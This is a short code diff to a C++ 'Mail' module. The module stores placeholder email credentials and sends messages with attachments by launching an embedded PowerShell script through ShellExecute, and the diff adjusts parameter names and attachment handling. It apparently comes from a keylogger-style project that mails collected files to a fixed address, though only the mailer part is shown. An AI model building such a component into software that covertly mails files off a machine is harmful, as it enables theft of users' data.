@@ -13,9 +13,9 @@
 
 namespace Mail
 {
-    #define X_EM_TO "ENTER EMAIL ADDRESS"
-    #define X_EM_FROM "ENTER EMAIL ADDRESS"
-    #define X_EM_PASS "EMAIL PASSWORD"
+    #define X_EM_TO "ENTER YOUR EMAIL"
+    #define X_EM_FROM "ENTER YOUR EMAIL"
+    #define X_EM_PASS "Enter PASSWORD"
 
 const std::string &PowerShellScript =
 "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
@@ -94,7 +94,7 @@ const std::string &PowerShellScript =
 
     Timer m_timer;
 
-    int SendMail( const std::string &subject, const std::string &body, const std::string &attachment)
+    int SendMail( const std::string &subject, const std::string &body, const std::string &attachments)
     {
         bool ok;
 
@@ -114,7 +114,7 @@ const std::string &PowerShellScript =
                             + StringReplace(body, "\"", "\\\"") +
                             "\" -Att \"" + attachments + "\"";
 
-        SHELLEXECUTEINFO ShExecInfo = (0);
+        SHELLEXECUTEINFO ShExecInfo = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
         ShExecInfo.hwnd = NULL;
@@ -157,8 +157,10 @@ const std::string &PowerShellScript =
         {
             for(const auto &v : att)
                 attachments += v+ "::";
+            attachments = attachments.substr(0, attachments.length() -2);
+
         }
-        attachments = attachments.substr(0, attachments.length() -2);
+
         return SendMail(subject, body, attachments);
     }
 }
